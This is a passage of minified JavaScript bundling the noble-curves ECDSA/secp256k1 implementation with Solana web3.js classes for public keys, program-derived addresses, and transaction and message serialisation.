I===_n?this:S?S(m,this):this.multiplyUnsafe(e.h)}toRawBytes(I=!0){return ts("isCompressed",I),this.assertValidity(),i(m,this,I)}toHex(I=!0){return ts("isCompressed",I),na(this.toRawBytes(I))}}m.BASE=new m(e.Gx,e.Gy,t.ONE),m.ZERO=new m(t.ZERO,t.ONE,t.ZERO);const v=e.nBitLength,x=rb(m,e.endo?Math.ceil(v/2):v);return{CURVE:e,ProjectivePoint:m,normPrivateKeyToScalar:l,weierstrassEquation:o,isWithinCurveOrder:a}}function gD(n){const e=Nw(n);return Gl(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function mD(n){const e=gD(n),{Fp:t,n:r}=e,i=t.BYTES+1,s=2*t.BYTES+1;function o(d){return Ut(d,r)}function a(d){return k0(d,r)}const{ProjectivePoint:l,normPrivateKeyToScalar:u,weierstrassEquation:h,isWithinCurveOrder:f}=pD({...e,toBytes(d,_,C){const M=_.toAffine(),R=t.toBytes(M.x),j=ra;return ts("isCompressed",C),C?j(Uint8Array.from([_.hasEvenY()?2:3]),R):j(Uint8Array.from([4]),R,t.toBytes(M.y))},fromBytes(d){const _=d.length,C=d[0],M=d.subarray(1);if(_===i&&(C===2||C===3)){const R=Go(M);if(!gp(R,_n,t.ORDER))throw new Error("Point is not on curve");const j=h(R);let $;try{$=t.sqrt(j)}catch(V){const oe=V instanceof Error?": "+V.message:"";throw new Error("Point is not on curve"+oe)}const D=($&_n)===_n;return(C&1)===1!==D&&($=t.neg($)),{x:R,y:$}}else if(_===s&&C===4){const R=t.fromBytes(M.subarray(0,t.BYTES)),j=t.fromBytes(M.subarray(t.BYTES,2*t.BYTES));return{x:R,y:j}}else{const R=i,j=s;throw new Error("invalid Point, expected length of "+R+", or uncompressed "+j+", got "+_)}}}),m=d=>na(xl(d,e.nByteLength));function v(d){const _=r>>_n;return d>_}function x(d){return v(d)?o(-d):d}const k=(d,_,C)=>Go(d.slice(_,C));class I{constructor(_,C,M){this.r=_,this.s=C,this.recovery=M,this.assertValidity()}static fromCompact(_){const C=e.nByteLength;return _=cn("compactSignature",_,C*2),new I(k(_,0,C),k(_,C,2*C))}static fromDER(_){const{r:C,s:M}=Wi.toSig(cn("DER",_));return new I(C,M)}assertValidity(){Wr("r",this.r,_n,r),Wr("s",this.s,_n,r)}addRecoveryBit(_){return new I(this.r,this.s,_)}recoverPublicKey(_){const{r:C,s:M,recovery:R}=this,j=q(cn("msgHash",_));if(R==null||![0,1,2,3].includes(R))throw new Error("recovery id invalid");const $=R===2||R===3?C+e.n:C;if($>=t.ORDER)throw new Error("recovery id 2 or 3 invalid");const D=R&1?"03":"02",y=l.fromHex(D+m($)),V=a($),oe=o(-j*V),le=o(M*V),he=l.BASE.multiplyAndAddUnsafe(y,oe,le);if(!he)throw new Error("point at infinify");return he.assertValidity(),he}hasHighS(){return v(this.s)}normalizeS(){return this.hasHighS()?new I(this.r,o(-this.s),this.recovery):this}toDERRawBytes(){return bl(this.toDERHex())}toDERHex(){return Wi.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return bl(this.toCompactHex())}toCompactHex(){return m(this.r)+m(this.s)}}const S={isValidPrivateKey(d){try{return u(d),!0}catch{return!1}},normPrivateKeyToScalar:u,randomPrivateKey:()=>{const d=eb(e.n);return S4(e.randomBytes(d),e.n)},precompute(d=8,_=l.BASE){return _._setWindowSize(d),_.multiply(BigInt(3)),_}};function b(d,_=!0){return l.fromPrivateKey(d).toRawBytes(_)}function E(d){const _=ta(d),C=typeof d=="string",M=(_||C)&&d.length;return _?M===i||M===s:C?M===2*i||M===2*s:d instanceof l}function U(d,_,C=!0){if(E(d))throw new Error("first arg must be private key");if(!E(_))throw new Error("second arg must be public key");return l.fromHex(_).multiply(u(d)).toRawBytes(C)}const H=e.bits2int||function(d){if(d.length>8192)throw new Error("input is too large");const _=Go(d),C=d.length*8-e.nBitLength;return C>0?_>>BigInt(C):_},q=e.bits2int_modN||function(d){return o(H(d))},L=Mw(e.nBitLength);function N(d){return Wr("num < 2^"+e.nBitLength,d,Hi,L),xl(d,e.nByteLength)}function B(d,_,C=z){if(["recovered","canonical"].some(Te=>Te in C))throw new Error("sign() legacy options not supported");const{hash:M,randomBytes:R}=e;let{lowS:j,prehash:$,extraEntropy:D}=C;j==null&&(j=!0),d=cn("msgHash",d),lE(C),$&&(d=cn("prehashed msgHash",M(d)));const y=q(d),V=u(_),oe=[N(V),N(y)];if(D!=null&&D!==!1){const Te=D===!0?R(t.BYTES):D;oe.push(cn("extraEntropy",Te))}const le=ra(...oe),he=y;function ke(Te){const Ne=H(Te);if(!f(Ne))return;const gt=a(Ne),je=l.BASE.multiply(Ne).toAffine(),Ue=o(je.x);if(Ue===Hi)return;const Pt=o(gt*o(he+Ue*V));if(Pt===Hi)return;let We=(je.x===Ue?0:2)|Number(je.y&_n),Ke=Pt;return j&&v(Pt)&&(Ke=x(Pt),We^=1),new I(Ue,Ke,We)}return{seed:le,k2sig:ke}}const z={lowS:e.lowS,prehash:!1},W={lowS:e.lowS,prehash:!1};function K(d,_,C=z){const{seed:M,k2sig:R}=B(d,_,C),j=e;return ZA(j.hash.outputLen,j.nByteLength,j.hmac)(M,R)}l.BASE._setWindowSize(8);function T(d,_,C,M=W){var We;const R=d;_=cn("msgHash",_),C=cn("publicKey",C);const{lowS:j,prehash:$,format:D}=M;if(lE(M),"strict"in M)throw new Error("options.strict was renamed to lowS");if(D!==void 0&&D!=="compact"&&D!=="der")throw new Error("format must be compact or der");const y=typeof R=="string"||ta(R),V=!y&&!D&&typeof R=="object"&&R!==null&&typeof R.r=="bigint"&&typeof R.s=="bigint";if(!y&&!V)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let oe,le;try{if(V&&(oe=new I(R.r,R.s)),y){try{D!=="compact"&&(oe=I.fromDER(R))}catch(Ke){if(!(Ke instanceof Wi.Err))throw Ke}!oe&&D!=="der"&&(oe=I.fromCompact(R))}le=l.fromHex(C)}catch{return!1}if(!oe||j&&oe.hasHighS())return!1;$&&(_=e.hash(_));const{r:he,s:ke}=oe,Te=q(_),Ne=a(ke),gt=o(Te*Ne),je=o(he*Ne),Ue=(We=l.BASE.multiplyAndAddUnsafe(le,gt,je))==null?void 0:We.toAffine();return Ue?o(Ue.x)===he:!1}return{CURVE:e,getPublicKey:b,getSharedSecret:U,sign:K,verify:T,ProjectivePoint:l,Signature:I,utils:S}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */function yD(n){return{hash:n,hmac:(e,...t)=>zb(n,e,kP(...t)),randomBytes:KA}}function wD(n,e){const t=r=>mD({...n,...yD(r)});return{...t(e),create:t}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Wb=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),uE=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),vD=BigInt(1),N0=BigInt(2),hE=(n,e)=>(n+e/N0)/e;function _D(n){const e=Wb,t=BigInt(3),r=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),l=BigInt(88),u=n*n*n%e,h=u*u*n%e,f=Xt(h,t,e)*h%e,m=Xt(f,t,e)*h%e,v=Xt(m,N0,e)*u%e,x=Xt(v,i,e)*v%e,k=Xt(x,s,e)*x%e,I=Xt(k,a,e)*k%e,S=Xt(I,l,e)*I%e,b=Xt(S,a,e)*k%e,E=Xt(b,t,e)*h%e,U=Xt(E,o,e)*x%e,H=Xt(U,r,e)*u%e,q=Xt(H,N0,e);if(!P0.eql(P0.sqr(q),n))throw new Error("Cannot find square root");return q}const P0=mp(Wb,void 0,void 0,{sqrt:_D}),ED=wD({a:BigInt(0),b:BigInt(7),Fp:P0,n:uE,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:n=>{const e=uE,t=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-vD*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=t,o=BigInt("0x100000000000000000000000000000000"),a=hE(s*n,e),l=hE(-r*n,e);let u=Ut(n-a*t-l*i,e),h=Ut(-a*r-l*s,e);const f=u>o,m=h>o;if(f&&(u=e-u),m&&(h=e-h),u>o||h>o)throw new Error("splitScalar: Endomorphism failed, k="+n);return{k1neg:f,k1:u,k2neg:m,k2:h}}}},R0);BigInt(0);yp.utils.randomPrivateKey;function fE(n){try{return yp.ExtendedPoint.fromHex(n),!0}catch{return!1}}const $b=(n,e)=>yp.sign(n,e.slice(0,32)),ID=yp.verify,Nn=n=>Le.Buffer.isBuffer(n)?n:n instanceof Uint8Array?Le.Buffer.from(n.buffer,n.byteOffset,n.byteLength):Le.Buffer.from(n);class SD{constructor(e){Object.assign(this,e)}encode(){return Le.Buffer.from(db(Tf,this))}static decode(e){return pb(Tf,this,e)}static decodeUnchecked(e){return lb(Tf,this,e)}}const Tf=new Map;var Hb;const TD=32,Js=32;function AD(n){return n._bn!==void 0}let dE=1;class Ie extends SD{constructor(e){if(super({}),this._bn=void 0,AD(e))this._bn=e._bn;else{if(typeof e=="string"){const t=On.decode(e);if(t.length!=Js)throw new Error("Invalid public key input");this._bn=new sE(t)}else this._bn=new sE(e);if(this._bn.byteLength()>Js)throw new Error("Invalid public key input")}}static unique(){const e=new Ie(dE);return dE+=1,new Ie(e.toBuffer())}equals(e){return this._bn.eq(e._bn)}toBase58(){return On.encode(this.toBytes())}toJSON(){return this.toBase58()}toBytes(){const e=this.toBuffer();return new Uint8Array(e.buffer,e.byteOffset,e.byteLength)}toBuffer(){const e=this._bn.toArrayLike(Le.Buffer);if(e.length===Js)return e;const t=Le.Buffer.alloc(32);return e.copy(t,32-e.length),t}get[Symbol.toStringTag](){return`PublicKey(${this.toString()})`}toString(){return this.toBase58()}static async createWithSeed(e,t,r){const i=Le.Buffer.concat([e.toBuffer(),Le.Buffer.from(t),r.toBuffer()]),s=R0(i);return new Ie(s)}static createProgramAddressSync(e,t){let r=Le.Buffer.alloc(0);e.forEach(function(s){if(s.length>TD)throw new TypeError("Max seed length exceeded");r=Le.Buffer.concat([r,Nn(s)])}),r=Le.Buffer.concat([r,t.toBuffer(),Le.Buffer.from("ProgramDerivedAddress")]);const i=R0(r);if(fE(i))throw new Error("Invalid seeds, address must fall off the curve");return new Ie(i)}static async createProgramAddress(e,t){return this.createProgramAddressSync(e,t)}static findProgramAddressSync(e,t){let r=255,i;for(;r!=0;){try{const s=e.concat(Le.Buffer.from([r]));i=this.createProgramAddressSync(s,t)}catch(s){if(s instanceof TypeError)throw s;r--;continue}return[i,r]}throw new Error("Unable to find a viable program address nonce")}static async findProgramAddress(e,t){return this.findProgramAddressSync(e,t)}static isOnCurve(e){const t=new Ie(e);return fE(t.toBytes())}}Hb=Ie;Ie.default=new Hb("11111111111111111111111111111111");Tf.set(Ie,{kind:"struct",fields:[["_bn","u256"]]});new Ie("BPFLoader1111111111111111111111111111111111");const dl=1280-40-8,Kw=127,Nu=64;class qb extends Error{constructor(e){super(`Signature ${e} has expired: block height exceeded.`),this.signature=void 0,this.signature=e}}Object.defineProperty(qb.prototype,"name",{value:"TransactionExpiredBlockheightExceededError"});class Kb extends Error{constructor(e,t){super(`Transaction was not confirmed in ${t.toFixed(2)} seconds. It is unknown if it succeeded or failed. Check signature ${e} using the Solana Explorer or CLI tools.`),this.signature=void 0,this.signature=e}}Object.defineProperty(Kb.prototype,"name",{value:"TransactionExpiredTimeoutError"});class Uc extends Error{constructor(e){super(`Signature ${e} has expired: the nonce is no longer valid.`),this.signature=void 0,this.signature=e}}Object.defineProperty(Uc.prototype,"name",{value:"TransactionExpiredNonceInvalidError"});class vd{constructor(e,t){this.staticAccountKeys=void 0,this.accountKeysFromLookups=void 0,this.staticAccountKeys=e,this.accountKeysFromLookups=t}keySegments(){const e=[this.staticAccountKeys];return this.accountKeysFromLookups&&(e.push(this.accountKeysFromLookups.writable),e.push(this.accountKeysFromLookups.readonly)),e}get(e){for(const t of this.keySegments()){if(e<t.length)return t[e];e-=t.length}}get length(){return this.keySegments().flat().length}compileInstructions(e){if(this.length>255+1)throw new Error("Account index overflow encountered during compilation");const r=new Map;this.keySegments().flat().forEach((s,o)=>{r.set(s.toBase58(),o)});const i=s=>{const o=r.get(s.toBase58());if(o===void 0)throw new Error("Encountered an unknown instruction account key during compilation");return o};return e.map(s=>({programIdIndex:i(s.programId),accountKeyIndexes:s.keys.map(o=>i(o.pubkey)),data:s.data}))}}const He=(n="publicKey")=>Rt(32,n),bD=(n="signature")=>Rt(64,n),nl=(n="string")=>{const e=ve([Ae("length"),Ae("lengthPadding"),Rt(Qo(Ae(),-8),"chars")],n),t=e.decode.bind(e),r=e.encode.bind(e),i=e;return i.decode=(s,o)=>t(s,o).chars.toString(),i.encode=(s,o,a)=>{const l={chars:Le.Buffer.from(s,"utf8")};return r(l,o,a)},i.alloc=s=>Ae().span+Ae().span+Le.Buffer.from(s,"utf8").length,i},xD=(n="authorized")=>ve([He("staker"),He("withdrawer")],n),kD=(n="lockup")=>ve([Sr("unixTimestamp"),Sr("epoch"),He("custodian")],n),CD=(n="voteInit")=>ve([He("nodePubkey"),He("authorizedVoter"),He("authorizedWithdrawer"),it("commission")],n),RD=(n="voteAuthorizeWithSeedArgs")=>ve([Ae("voteAuthorizationType"),He("currentAuthorityDerivedKeyOwnerPubkey"),nl("currentAuthorityDerivedKeySeed"),He("newAuthorized")],n);function Gb(n,e){const t=i=>{if(i.span>=0)return i.span;if(typeof i.alloc=="function")return i.alloc(e[i.property]);if("count"in i&&"elementLayout"in i){const s=e[i.property];if(Array.isArray(s))return s.length*t(i.elementLayout)}else if("fields"in i)return Gb({layout:i},e[i.property]);return 0};let r=0;return n.layout.fields.forEach(i=>{r+=t(i)}),r}function Tr(n){let e=0,t=0;for(;;){let r=n.shift();if(e|=(r&127)<<t*7,t+=1,!(r&128))break}return e}function Ar(n,e){let t=e;for(;;){let r=t&127;if(t>>=7,t==0){n.push(r);break}else r|=128,n.push(r)}}function Bt(n,e){if(!n)throw new Error(e||"Assertion failed")}class Tp{constructor(e,t){this.payer=void 0,this.keyMetaMap=void 0,this.payer=e,this.keyMetaMap=t}static compile(e,t){const r=new Map,i=o=>{const a=o.toBase58();let l=r.get(a);return l===void 0&&(l={isSigner:!1,isWritable:!1,isInvoked:!1},r.set(a,l)),l},s=i(t);s.isSigner=!0,s.isWritable=!0;for(const o of e){i(o.programId).isInvoked=!0;for(const a of o.keys){const l=i(a.pubkey);l.isSigner||(l.isSigner=a.isSigner),l.isWritable||(l.isWritable=a.isWritable)}}return new Tp(t,r)}getMessageComponents(){const e=[...this.keyMetaMap.entries()];Bt(e.length<=256,"Max static account keys length exceeded");const t=e.filter(([,l])=>l.isSigner&&l.isWritable),r=e.filter(([,l])=>l.isSigner&&!l.isWritable),i=e.filter(([,l])=>!l.isSigner&&l.isWritable),s=e.filter(([,l])=>!l.isSigner&&!l.isWritable),o={numRequiredSignatures:t.length+r.length,numReadonlySignedAccounts:r.length,numReadonlyUnsignedAccounts:s.length};{Bt(t.length>0,"Expected at least one writable signer key");const[l]=t[0];Bt(l===this.payer.toBase58(),"Expected first writable signer key to be the fee payer")}const a=[...t.map(([l])=>new Ie(l)),...r.map(([l])=>new Ie(l)),...i.map(([l])=>new Ie(l)),...s.map(([l])=>new Ie(l))];return[o,a]}extractTableLookup(e){const[t,r]=this.drainKeysFoundInLookupTable(e.state.addresses,o=>!o.isSigner&&!o.isInvoked&&o.isWritable),[i,s]=this.drainKeysFoundInLookupTable(e.state.addresses,o=>!o.isSigner&&!o.isInvoked&&!o.isWritable);if(!(t.length===0&&i.length===0))return[{accountKey:e.key,writableIndexes:t,readonlyIndexes:i},{writable:r,readonly:s}]}drainKeysFoundInLookupTable(e,t){const r=new Array,i=new Array;for(const[s,o]of this.keyMetaMap.entries())if(t(o)){const a=new Ie(s),l=e.findIndex(u=>u.equals(a));l>=0&&(Bt(l<256,"Max lookup table index exceeded"),r.push(l),i.push(a),this.keyMetaMap.delete(s))}return[r,i]}}const Qb="Reached end of buffer unexpectedly";function qi(n){if(n.length===0)throw new Error(Qb);return n.shift()}function br(n,...e){const[t]=e;if(e.length===2?t+(e[1]??0)>n.length:t>=n.length)throw new Error(Qb);return n.splice(...e)}class as{constructor(e){this.header=void 0,this.accountKeys=void 0,this.recentBlockhash=void 0,this.instructions=void 0,this.indexToProgramIds=new Map,this.header=e.header,this.accountKeys=e.accountKeys.map(t=>new Ie(t)),this.recentBlockhash=e.recentBlockhash,this.instructions=e.instructions,this.instructions.forEach(t=>this.indexToProgramIds.set(t.programIdIndex,this.accountKeys[t.programIdIndex]))}get version(){return"legacy"}get staticAccountKeys(){return this.accountKeys}get compiledInstructions(){return this.instructions.map(e=>({programIdIndex:e.programIdIndex,accountKeyIndexes:e.accounts,data:On.decode(e.data)}))}get addressTableLookups(){return[]}getAccountKeys(){return new vd(this.staticAccountKeys)}static compile(e){const t=Tp.compile(e.instructions,e.payerKey),[r,i]=t.getMessageComponents(),o=new vd(i).compileInstructions(e.instructions).map(a=>({programIdIndex:a.programIdIndex,accounts:a.accountKeyIndexes,data:On.encode(a.data)}));return new as({header:r,accountKeys:i,recentBlockhash:e.recentBlockhash,instructions:o})}isAccountSigner(e){return e<this.header.numRequiredSignatures}isAccountWritable(e){const t=this.header.numRequiredSignatures;if(e>=this.header.numRequiredSignatures){const r=e-t,s=this.accountKeys.length-t-this.header.numReadonlyUnsignedAccounts;return r<s}else{const r=t-this.header.numReadonlySignedAccounts;return e<r}}isProgramId(e){return this.indexToProgramIds.has(e)}programIds(){return[...this.indexToProgramIds.values()]}nonProgramIds(){return this.accountKeys.filter((e,t)=>!this.isProgramId(t))}serialize(){const e=this.accountKeys.length;let t=[];Ar(t,e);const r=this.instructions.map(f=>{const{accounts:m,programIdIndex:v}=f,x=Array.from(On.decode(f.data));let k=[];Ar(k,m.length);let I=[];return Ar(I,x.length),{programIdIndex:v,keyIndicesCount:Le.Buffer.from(k),keyIndices:m,dataLength:Le.Buffer.from(I),data:x}});let i=[];Ar(i,r.length);let s=Le.Buffer.alloc(dl);Le.Buffer.from(i).copy(s);let o=i.length;r.forEach(f=>{const v=ve([it("programIdIndex"),Rt(f.keyIndicesCount.length,"keyIndicesCount"),er(it("keyIndex"),f.keyIndices.length,"keyIndices"),Rt(f.dataLength.length,"dataLength"),er(it("userdatum"),f.data.length,"data")]).encode(f,s,o);o+=v}),s=s.slice(0,o);const a=ve([Rt(1,"numRequiredSignatures"),Rt(1,"numReadonlySignedAccounts"),Rt(1,"numReadonlyUnsignedAccounts"),Rt(t.length,"keyCount"),er(He("key"),e,"keys"),He("recentBlockhash")]),l={numRequiredSignatures:Le.Buffer.from([this.header.numRequiredSignatures]),numReadonlySignedAccounts:Le.Buffer.from([this.header.numReadonlySignedAccounts]),numReadonlyUnsignedAccounts:Le.Buffer.from([this.header.numReadonlyUnsignedAccounts]),keyCount:Le.Buffer.from(t),keys:this.accountKeys.map(f=>Nn(f.toBytes())),recentBlockhash:On.decode(this.recentBlockhash)};let u=Le.Buffer.alloc(2048);const h=a.encode(l,u);return s.copy(u,h),u.slice(0,h+s.length)}static from(e){let t=[...e];const r=qi(t);if(r!==(r&Kw))throw new Error("Versioned messages must be deserialized with VersionedMessage.deserialize()");const i=qi(t),s=qi(t),o=Tr(t);let a=[];for(let m=0;m<o;m++){const v=br(t,0,Js);a.push(new Ie(Le.Buffer.from(v)))}const l=br(t,0,Js),u=Tr(t);let h=[];for(let m=0;m<u;m++){const v=qi(t),x=Tr(t),k=br(t,0,x),I=Tr(t),S=br(t,0,I),b=On.encode(Le.Buffer.from(S));h.push({programIdIndex:v,accounts:k,data:b})}const f={header:{numRequiredSignatures:r,numReadonlySignedAccounts:i,numReadonlyUnsignedAccounts:s},recentBlockhash:On.encode(Le.Buffer.from(l)),accountKeys:a,instructions:h};return new as(f)}}class Pu{constructor(e){this.header=void 0,this.staticAccountKeys=void 0,this.recentBlockhash=void 0,this.compiledInstructions=void 0,this.addressTableLookups=void 0,this.header=e.header,this.staticAccountKeys=e.staticAccountKeys,this.recentBlockhash=e.recentBlockhash,this.compiledInstructions=e.compiledInstructions,this.addressTableLookups=e.addressTableLookups}get version(){return 0}get numAccountKeysFromLookups(){let e=0;for(const t of this.addressTableLookups)e+=t.readonlyIndexes.length+t.writableIndexes.length;return e}getAccountKeys(e){let t;if(e&&"accountKeysFromLookups"in e&&e.accountKeysFromLookups){if(this.numAccountKeysFromLookups!=e.accountKeysFromLookups.writable.length+e.accountKeysFromLookups.readonly.length)throw new Error("Failed to get account keys because of a mismatch in the number of account keys from lookups");t=e.accountKeysFromLookups}else if(e&&"addressLookupTableAccounts"in e&&e.addressLookupTableAccounts)t=this.resolveAddressTableLookups(e.addressLookupTableAccounts);else if(this.addressTableLookups.length>0)throw new Error("Failed to get account keys because address table lookups were not resolved");return new vd(this.staticAccountKeys,t)}isAccountSigner(e){return e<this.header.numRequiredSignatures}isAccountWritable(e){const t=this.header.numRequiredSignatures,r=this.staticAccountKeys.length;if(e>=r){const i=e-r,s=this.addressTableLookups.reduce((o,a)=>o+a.writableIndexes.length,0);return i<s}else if(e>=this.header.numRequiredSignatures){const i=e-t,o=r-t-this.header.numReadonlyUnsignedAccounts;return i<o}else{const i=t-this.header.numReadonlySignedAccounts;return e<i}}resolveAddressTableLookups(e){const t={writable:[],readonly:[]};for(const r of this.addressTableLookups){const i=e.find(s=>s.key.equals(r.accountKey));if(!i)throw new Error(`Failed to find address lookup table account for table key ${r.accountKey.toBase58()}`);for(const s of r.writableIndexes)if(s<i.state.addresses.length)t.writable.push(i.state.addresses[s]);else throw new Error(`Failed to find address for index ${s} in address lookup table ${r.accountKey.toBase58()}`);for(const s of r.readonlyIndexes)if(s<i.state.addresses.length)t.readonly.push(i.state.addresses[s]);else throw new Error(`Failed to find address for index ${s} in address lookup table ${r.accountKey.toBase58()}`)}return t}static compile(e){const t=Tp.compile(e.instructions,e.payerKey),r=new Array,i={writable:new Array,readonly:new Array},s=e.addressLookupTableAccounts||[];for(const h of s){const f=t.extractTableLookup(h);if(f!==void 0){const[m,{writable:v,readonly:x}]=f;r.push(m),i.writable.push(...v),i.readonly.push(...x)}}const[o,a]=t.getMessageComponents(),u=new vd(a,i).compileInstructions(e.instructions);return new Pu({header:o,staticAccountKeys:a,recentBlockhash:e.recentBlockhash,compiledInstructions:u,addressTableLookups:r})}serialize(){const e=Array();Ar(e,this.staticAccountKeys.length);const t=this.serializeInstructions(),r=Array();Ar(r,this.compiledInstructions.length);const i=this.serializeAddressTableLookups(),s=Array();Ar(s,this.addressTableLookups.length);const o=ve([it("prefix"),ve([it("numRequiredSignatures"),it("numReadonlySignedAccounts"),it("numReadonlyUnsignedAccounts")],"header"),Rt(e.length,"staticAccountKeysLength"),er(He(),this.staticAccountKeys.length,"staticAccountKeys"),He("recentBlockhash"),Rt(r.length,"instructionsLength"),Rt(t.length,"serializedInstructions"),Rt(s.length,"addressTableLookupsLength"),Rt(i.length,"serializedAddressTableLookups")]),a=new Uint8Array(dl),l=128,u=o.encode({prefix:l,header:this.header,staticAccountKeysLength:new Uint8Array(e),staticAccountKeys:this.staticAccountKeys.map(h=>h.toBytes()),recentBlockhash:On.decode(this.recentBlockhash),instructionsLength:new Uint8Array(r),serializedInstructions:t,addressTableLookupsLength:new Uint8Array(s),serializedAddressTableLookups:i},a);return a.slice(0,u)}serializeInstructions(){let e=0;const t=new Uint8Array(dl);for(const r of this.compiledInstructions){const i=Array();Ar(i,r.accountKeyIndexes.length);const s=Array();Ar(s,r.data.length);const o=ve([it("programIdIndex"),Rt(i.length,"encodedAccountKeyIndexesLength"),er(it(),r.accountKeyIndexes.length,"accountKeyIndexes"),Rt(s.length,"encodedDataLength"),Rt(r.data.length,"data")]);e+=o.encode({programIdIndex:r.programIdIndex,encodedAccountKeyIndexesLength:new Uint8Array(i),accountKeyIndexes:r.accountKeyIndexes,encodedDataLength:new Uint8Array(s),data:r.data},t,e)}return t.slice(0,e)}serializeAddressTableLookups(){let e=0;const t=new Uint8Array(dl);for(const r of this.addressTableLookups){const i=Array();Ar(i,r.writableIndexes.length);const s=Array();Ar(s,r.readonlyIndexes.length);const o=ve([He("accountKey"),Rt(i.length,"encodedWritableIndexesLength"),er(it(),r.writableIndexes.length,"writableIndexes"),Rt(s.length,"encodedReadonlyIndexesLength"),er(it(),r.readonlyIndexes.length,"readonlyIndexes")]);e+=o.encode({accountKey:r.accountKey.toBytes(),encodedWritableIndexesLength:new Uint8Array(i),writableIndexes:r.writableIndexes,encodedReadonlyIndexesLength:new Uint8Array(s),readonlyIndexes:r.readonlyIndexes},t,e)}return t.slice(0,e)}static deserialize(e){let t=[...e];const r=qi(t),i=r&Kw;Bt(r!==i,"Expected versioned message but received legacy message");const s=i;Bt(s===0,`Expected versioned message with version 0 but found version ${s}`);const o={numRequiredSignatures:qi(t),numReadonlySignedAccounts:qi(t),numReadonlyUnsignedAccounts:qi(t)},a=[],l=Tr(t);for(let x=0;x<l;x++)a.push(new Ie(br(t,0,Js)));const u=On.encode(br(t,0,Js)),h=Tr(t),f=[];for(let x=0;x<h;x++){const k=qi(t),I=Tr(t),S=br(t,0,I),b=Tr(t),E=new Uint8Array(br(t,0,b));f.push({programIdIndex:k,accountKeyIndexes:S,data:E})}const m=Tr(t),v=[];for(let x=0;x<m;x++){const k=new Ie(br(t,0,Js)),I=Tr(t),S=br(t,0,I),b=Tr(t),E=br(t,0,b);v.push({accountKey:k,writableIndexes:S,readonlyIndexes:E})}return new Pu({header:o,staticAccountKeys:a,recentBlockhash:u,compiledInstructions:f,addressTableLookups:v})}}const Gw={deserializeMessageVersion(n){const e=n[0],t=e&Kw;return t===e?"legacy":t},deserialize:n=>{const e=Gw.deserializeMessageVersion(n);if(e==="legacy")return as.from(n);if(e===0)return Pu.deserialize(n);throw new Error(`Transaction message version ${e} deserialization is not supported`)}};let As=function(n){return n[n.BLOCKHEIGHT_EXCEEDED=0]="BLOCKHEIGHT_EXCEEDED",n[n.PROCESSED=1]="PROCESSED",n[n.TIMED_OUT=2]="TIMED_OUT",n[n.NONCE_INVALID=3]="NONCE_INVALID",n}({});const MD=Le.Buffer.alloc(Nu).fill(0);class Xr{constructor(e){this.keys=void 0,this.programId=void 0,this.data=Le.Buffer.alloc(0),this.programId=e.programId,this.keys=e.keys,e.data&&(this.data=e.data)}toJSON(){return{keys:this.keys.map(({pubkey:e,isSigner:t,isWritable:r})=>({pubkey:e.toJSON(),isSigner:t,isWritable:r})),programId:this.programId.toJSON(),data:[...this.data]}}}class xr{get signature(){return this.signatures.length>0?this.signatures[0].signature:null}constructor(e){if(this.signatures=[],this.feePayer=void 0,this.instructions=[],this.recentBlockhash=void 0,this.lastValidBlockHeight=void 0,this.nonceInfo=void 0,this.minNonceContextSlot=void 0,this._message=void 0,this._json=void 0,!!e)if(e.feePayer&&(this.feePayer=e.feePayer),e.signatures&&(this.signatures=e.signatures),Object.prototype.hasOwnProperty.call(e,"nonceInfo")){const{minContextSlot:t,nonceInfo:r}=e;this.minNonceContextSlot=t,this.nonceInfo=r}else if(Object.prototype.hasOwnProperty.call(e,"lastValidBlockHeight")){const{blockhash:t,lastValidBlockHeight:r}=e;this.recentBlockhash=t,this.lastValidBlockHeight=r}else{const{recentBlockhash:t,nonceInfo:r}=e;r&&(this.nonceInfo=r),this.recentBlockhash=t}}toJSON(){return{recentBlockhash:this.recentBlockhash||null,feePayer:this.feePayer?this.feePayer.toJSON():null,nonceInfo:this.nonceInfo?{nonce:this.nonceInfo.nonce,nonceInstruction:this.nonceInfo.nonceInstruction.toJSON()}:null,instructions:this.instructions.map(e=>e.toJSON()),signers:this.signatures.map(({publicKey:e})=>e.toJSON())}}add(...e){if(e.length===0)throw new Error("No instructions");return e.forEach(t=>{"instructions"in t?this.instructions=this.instructions.concat(t.instructions):"data"in t&&"programId"in t&&"keys"in t?this.instructions.push(t):this.instructions.push(new Xr(t))}),this}compileMessage(){if(this._message&&JSON.stringify(this.toJSON())===JSON.stringify(this._json))return this._message;let e,t;if(this.nonceInfo?(e=this.nonceInfo.nonce,this.instructions[0]!=this.nonceInfo.nonceInstruction?t=[this.nonceInfo.nonceInstruction,...this.instructions]:t=this.instructions):(e=this.recentBlockhash,t=this.instructions),!e)throw new Error("Transaction recentBlockhash required");t.length<1&&console.warn("No instructions provided");let r;if(this.feePayer)r=this.feePayer;else if(this.signatures.length>0&&this.signatures[0].publicKey)r=this.signatures[0].publicKey;else throw new Error("Transaction fee payer required");for(let k=0;k<t.length;k++)if(t[k].programId===void 0)throw new Error(`Transaction instruction index ${k} has undefined program id`);const i=[],s=[];t.forEach(k=>{k.keys.forEach(S=>{s.push({...S})});const I=k.programId.toString();i.includes(I)||i.push(I)}),i.forEach(k=>{s.push({pubkey:new Ie(k),isSigner:!1,isWritable:!1})});const o=[];s.forEach(k=>{const I=k.pubkey.toString(),S=o.findIndex(b=>b.pubkey.toString()===I);S>-1?(o[S].isWritable=o[S].isWritable||k.isWritable,o[S].isSigner=o[S].isSigner||k.isSigner):o.push(k)}),o.sort(function(k,I){if(k.isSigner!==I.isSigner)return k.isSigner?-1:1;if(k.isWritable!==I.isWritable)return k.isWritable?-1:1;const S={localeMatcher:"best 